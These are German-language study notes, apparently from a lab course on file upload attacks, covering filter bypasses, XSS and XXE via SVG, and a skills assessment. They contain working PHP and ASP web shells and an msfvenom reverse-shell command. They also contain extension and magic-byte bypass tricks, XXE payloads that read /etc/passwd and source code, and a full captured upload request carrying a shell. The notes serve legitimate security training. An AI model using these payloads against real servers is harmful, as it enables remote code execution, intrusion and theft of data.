File Upload Attacks

Intro to File Upload Attacks:
- Viele Webseiten erlauben es Dateien hochzuladen
- File Uploads gehoeren zu den haeufigsten Schwachstellen

- Types of File Upload Attacks:
	- Meistens werden die Dateien nicht validiert/ueberprueft
	- Meistens ueberpruefen Entwickler den Typen und den Inhalt einer Datei

#############################################################################################
Basic Exploitation
1. Absent Validation:
- Die standardmaessige Schwachstelle ist wenn die Anwendung keine Validierung ausfuehrt
- Meistens wir der Dateityp bei der Auswahl einer Datei angezeigt

- Identifying Web Framework:
	- Wir koennen eine Datei erstellen die uns eine Web Shell oder eine Reverse Shell verwenden laesst

- Vulerability Identification:
	- Wenn wir das Framework identifiziert haben koennen wir unser Script auf die Programmiersprache/Frameworks anpassen
	- Dann koennen wir in das Upload Verzeichnis wechseln und die Datei aufrufen ueber die URL

- Question:
	- Create File:
		- <?php echo gethostname();?>
	- http://167.99.205.156:31223/uploads/script.php

2. Upload Exploitation:
- Web Shells:
	- Es gibt mehrere vorgefertigte Web Shells die zur Verfuegung stehen

- Writing Custom Web Shells:
	- Wir sollten wissen wie wir unsere eigene Web Shell schreiben koennen
	- In PHP koennen wir die system() Funktion verwenden um Betriebssystem Funktionen auszufuehren
	- Wir koennen hier cmd aufrufen mit $_REQUEST['cmd'] aufrufen
	- Mit http://SERVER_IP:PORT/uploads/shell.php?cmd=id koennen wir die Web Shell verwenden
	- Fuer .NET gibt es eval() fuer OS Funktionen
	- Um eine Web Shell zu erhalten <% eval request('cmd') %>

- Reverse Shell:
	- Wir koennen ebenfalls eine Reverse Shell erhalten
	- Eine vorgefertigte Shell ist pentestmonkey
	- Hier muessen wir einen ReverShell erstellen mit IP und Port und einen Listener ausfuehren

- Generating Custom Reverse Shell Scripts:
	- Mit msfvenom koennen wir koennen wir eine Custom Reverse Shell erstellen
	- msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

- Question:
	- <?php system($_REQUEST['cmd']); ?>
	- http://165.232.42.197:30967/uploads/a.php?cmd=cat%20/flag.txt

#############################################################################################
Bypassing Filters
1. Client-Side Validation:
- Viele Webanwendungen fuehren eine Front-End Validierung durch in dem diese den Dateitypen pruefen
- Wenn wir die Antwort mit Burp abfangen koennen wir den Content-Type in den angenommenen Typ aendern
- Wir koennen ausserdem den Filenamen aendern mit der richtigen Endung

- Diasbling Front-End Validation:
	- Wir koennen ausserdem die Seite aendern und die Validierungsfunktion ueberpruefen oder gar ganz aus dem Quellcode der Website loeschen

- Question:
	- <?php system($_REQUEST['cmd']); ?>
	- Disable Validation Function
	- http://138.68.146.81:32419/profile_images/a.php?cmd=cat%20/flag.txt

2. Blacklist Filter:
- Viele Filter sind auf dem Backend Server vorhanden
- Dennoch koennen wir diese Filter umgehen

- Blacklisting Extensions:
	- Die schwaechste Form der Validierung ist die Blacklist hier werden manche Dateitypen ausgeschlossen

- Fuzzing Extensions:
	- PayloadsAllTheThings hat eine Liste fuer Endungen fuer PHP und .NET
	- SecList hat ebenfalls eine Liste Web Extensions

- Question:
	- <?php system($_REQUEST['cmd']); ?>
	- Check the Extensionlist
	- Try out what extension works
	- phar does work
	- http://138.68.146.81:31026/?cmd=cat%20/flag.txt

3. Whitelist Filters:
- Ein Whitelist Filter erlaubt nur einige Dateiendungen

- Double Extensions:
	- Wir koennen Doppelendungen verwenden wie .jpg.php um eine Whitelist zu umgehen

- Character Injection:
	- Wir koenen vor und nach einer Dateiendung Zeichen einfuegen und somit die Webanwendung dazu bringen die Endung anders zu interpretieren
	- Fuer PHP Server mit hoeherere Version als 5.X ist %00 nuetzlich wie .php%00.jpg diese stoppt nach %00 den Dateinamen und speichert die Datei mit .php Endung

- Question:
- <?php system($_REQUEST['cmd']); ?>
- filename="shell.phar.jpg"
- 165.227.226.146:30767/profile_images/shell.phar.jpg

4. Type Filters:
- Die meisten Filter in Webanwendungen ueberpruefen auch den Content-Type mit zwei Methoden wie Content-Type Header oder File Content

- Content-Type:
	- Wir koennen ueberpruefen welcher Conten-Type ankzeptiert wird mit der Wortliste https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

- MIME-Type:
	- Multipurpose Internet Mail Extensions(MIMI) ist ein Standard fuer eine Datei die Format und Byte Struktur vorgibt
	- Die ersten Bytes enthalten die Bytes fuer den File Content
	- Mit file <Dateiname> kann der MIME Type ausgegeben werden

- Question:
	- ÿØÿà<?php system($_REQUEST['cmd']); ?>
	- filename="shell.gif.phar"
	- content-type="image/gif"
	- 178.128.169.240:32026/profile_images/shell.gif.phar
	- GET /profile_images/shell.gif.phar?cmd=cat%20/flag.txt

#############################################################################################
Other Upload Attacks:
1. Limited File Uploads:
- Manche Webanwendungen lassen sich SVG,HTML,XML usw zu
- Hier kann eine schadhafte Version verwendet werden

- XSS:
	- Viele Dateitypen erlauben uns ein Stored XSS Schwachstelle auszunutzen
	- Mit dieser XSS Schwachstelle koennen wir JavaScript Code einfuegen
	- Wir koennen Daten in den Metadaten in einem Bild einfuegen
	- Mit exiftool koennen diese Metadaten geschrieben werden
	- Ebenfalls koennen wir mit SVG Metadaten mit einfuegen die dann ausgefuehrt werden

- XXE:
	- In einer SVG Datei koennen wir ebenso XML Daten einschleusen um Source Code zu bekommen

- Question:
	- 1. 
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<svg>&xxe;</svg>

	- 2.
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
		<svg>&xxe;</svg>

#############################################################################################
Skills Assessment
1. Skills Assessment - File Upload Attacks:
- <?php system($_REQUEST['cmd']); ?>
- http://165.227.232.214:32723/contact/user_feedback_submissions/230514_shell.phar.png?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
- Content-Disposition: form-data; name="uploadFile"; filename="shell.png"
- Content-Type="image/jpg



#############################################################################################################################################
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>


<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}


#############################################################################################################################################
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=common-functions.php"> ]>
<svg>&xxe;</svg>


<?php
function displayHTMLImage($imageFile)
{
    $type = mime_content_type($imageFile);

    switch ($type) {
        case 'image/jpg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/jpeg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/png':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/gif':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/svg+xml':
            libxml_disable_entity_loader(false);
            $doc = new DOMDocument();
            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
            $svg = $doc->getElementsByTagName('svg');
            echo $svg->item(0)->C14N();
            break;
        default:
            echo "Image type not recognized";
    }
}




POST /contact/upload.php HTTP/1.1
Host: 165.227.232.214:32723
Content-Length: 258
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6SrGdnEc3D5YkQax
Origin: http://165.227.232.214:32723
Referer: http://165.227.232.214:32723/contact/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundary6SrGdnEc3D5YkQax
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.png"
Content-Type: image/png

PNG

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundary6SrGdnEc3D5YkQax--